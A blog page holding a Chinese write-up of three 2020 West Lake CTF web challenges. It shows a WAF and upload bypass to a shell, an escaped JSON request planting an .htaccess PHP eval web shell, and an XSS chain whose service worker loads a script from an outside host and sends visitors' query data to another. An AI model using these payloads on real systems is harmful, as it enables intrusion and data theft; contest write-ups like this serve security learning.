@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>2020西湖论剑 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="西湖论剑NewUploadhint:我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。看看宝塔自己装的 apache 有什么东西？ %00干掉宝塔waf 任意文件上传过滤php关键字上传.htaccess绕过普通的payload并不适用与php-fpm通信在&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;apache下发现php的解析方式 1234#PHP   &lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020西湖论剑">
+<meta property="og:url" content="http://example.com/2021/10/01/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="西湖论剑NewUploadhint:我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。看看宝塔自己装的 apache 有什么东西？ %00干掉宝塔waf 任意文件上传过滤php关键字上传.htaccess绕过普通的payload并不适用与php-fpm通信在&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;apache下发现php的解析方式 1234#PHP   &lt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png">
+<meta property="article:published_time" content="2021-10-01T11:06:19.627Z">
+<meta property="article:modified_time" content="2021-10-01T11:06:19.627Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2020西湖论剑" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/01/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" class="article-date">
+  <time class="dt-published" datetime="2021-10-01T11:06:19.627Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      2020西湖论剑
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>hint:<br>我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。<br>看看宝塔自己装的 apache 有什么东西？</p>
+<p>%00干掉宝塔waf</p>
+<p>任意文件上传过滤php关键字<br>上传.htaccess绕过<br>普通的payload并不适用与php-fpm通信<br>在<code>/www/server/panel/vhost/apache</code>下发现php的解析方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#PHP</span><br><span class="line">   &lt;FilesMatch \.php$&gt;</span><br><span class="line">           SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;</span><br><span class="line">   &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接设置<code>SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;</code>，访问我们上传的后门并不行，查了下资料发现php-fpm有security.limit_extensions限制了php脚本的后缀名，它的默认值是:<code> .php .phar</code></p>
+<p>所以我们上传phar文件getshell,getshell后发现，我们需要readflag而，命令执行函数都被干掉了，php版本是php 7.4.10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure>
+
+<p>把<a target="_blank" rel="noopener" href="https://github.com/Explorersss/exploits%E4%B8%AD%E7%9A%84%E8%84%9A%E6%9C%AC%E8%AF%95%E8%BF%87%E4%B8%80%E8%BE%B9%E5%90%8E%E9%83%BD%E4%B8%8D%E8%A1%8C">https://github.com/Explorersss/exploits中的脚本试过一边后都不行</a></p>
+<p>但是这里php-fpm服务是通过socket文件通信的，我们可以直接打php-fpm绕过disable function</p>
+<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php">https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php</a></p>
+<h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.sha1(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$sandbox</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$sandbox</span>.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="variable">$content</span> = json_decode(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="variable">$content</span>-&gt;content;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span>.<span class="variable">$filename</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>,<span class="variable">$filecontent</span>.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$action</span> == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink(<span class="variable">$sandbox</span>.<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?source=1&amp;action=write&amp;filename=index.php HTTP/1.1</span><br><span class="line">Host: easyjson.xhlj.wetolink.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 439</span><br><span class="line"></span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag{a5db5397505f825334aa4dfc17d3bb9f}</p>
+<h2 id="hardxss"><a href="#hardxss" class="headerlink" title="hardxss"></a>hardxss</h2><p>在登入接口发现如下代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">callback = <span class="string">&quot;get_user_login_status&quot;</span>;</span><br><span class="line">		auto_reg_var();</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">typeof</span>(jump_url) == <span class="string">&quot;undefined&quot;</span> || <span class="regexp">/^\//</span>.test(jump_url))&#123;</span><br><span class="line">			jump_url = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		jsonp(<span class="string">&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot;</span> + callback,<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(result[<span class="string">&#x27;status&#x27;</span>])&#123;</span><br><span class="line">				location.href = jump_url;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, success</span>) </span>&#123;</span><br><span class="line">		    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">		    <span class="keyword">if</span>(url.indexOf(<span class="string">&quot;callback&quot;</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		    	<span class="keyword">var</span> funName = <span class="string">&#x27;callback_&#x27;</span> + <span class="built_in">Date</span>.now() + <span class="built_in">Math</span>.random().toString().substr(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">		    	url = url + <span class="string">&quot;?&quot;</span> + <span class="string">&quot;callback=&quot;</span> + funName;</span><br><span class="line">		    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    	<span class="keyword">var</span> funName = callback;</span><br><span class="line">		    &#125;</span><br><span class="line">		    <span class="built_in">window</span>[funName] = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		        success(data);</span><br><span class="line">		        <span class="keyword">delete</span> <span class="built_in">window</span>[funName];</span><br><span class="line">		        <span class="built_in">document</span>.body.removeChild(script);</span><br><span class="line">		    &#125;</span><br><span class="line">		    script.src = url;</span><br><span class="line">		    <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">auto_reg_var</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">var</span> search = location.search.slice(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">var</span> search_arr = search.split(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; search_arr.length; i++)&#123;</span><br><span class="line">				[key,value] = search_arr[i].split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">				<span class="built_in">window</span>[key] = value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用jsonp任意xss</p>
+<p>view-source:<a target="_blank" rel="noopener" href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)</a>;</p>
+<p>利用Service Workers从xss.hardxss.xhlj.wetolink.com移动到auth.hardxss.xhlj.wetolink.com</p>
+<p><a target="_blank" rel="noopener" href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//</a></p>
+<p>2:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain=<span class="string">&quot;hardxss.xhlj.wetolink.com&quot;</span>;</span><br><span class="line">a=<span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">a.src=<span class="string">&quot;https://auth.hardxss.xhlj.wetolink.com&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.body.append(a);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].addEventListener(<span class="string">&quot;load&quot;</span>,<span class="function">()=&gt;</span>&#123;fuck()&#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="string">`navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#x27;//serviceworker.free.beeceptor.com/exp.js&#x27;);//&quot;)`</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].contentWindow.eval(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>/:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.respondWith(<span class="keyword">new</span> Response(<span class="string">&#x27;&lt;html&gt;&lt;script&gt;document.location.href=&quot;http://ccreater.top:60000/?&quot;+document.location.search&lt;/script&gt;&lt;/html&gt;&#x27;</span>,&#123;<span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span> &#125;&#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png" alt="image5725"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png" alt="image5832"></p>
+<p>详细说明见：<a target="_blank" rel="noopener" href="http://blog.ccreater.top/2020/10/15/Service%20Worker/">http://blog.ccreater.top/2020/10/15/Service%20Worker/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/01/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-id="cku89gxt8000rwvosc55xhber" data-title="2020西湖论剑" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/01/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2020第三届BJDCTF
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">3月做题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
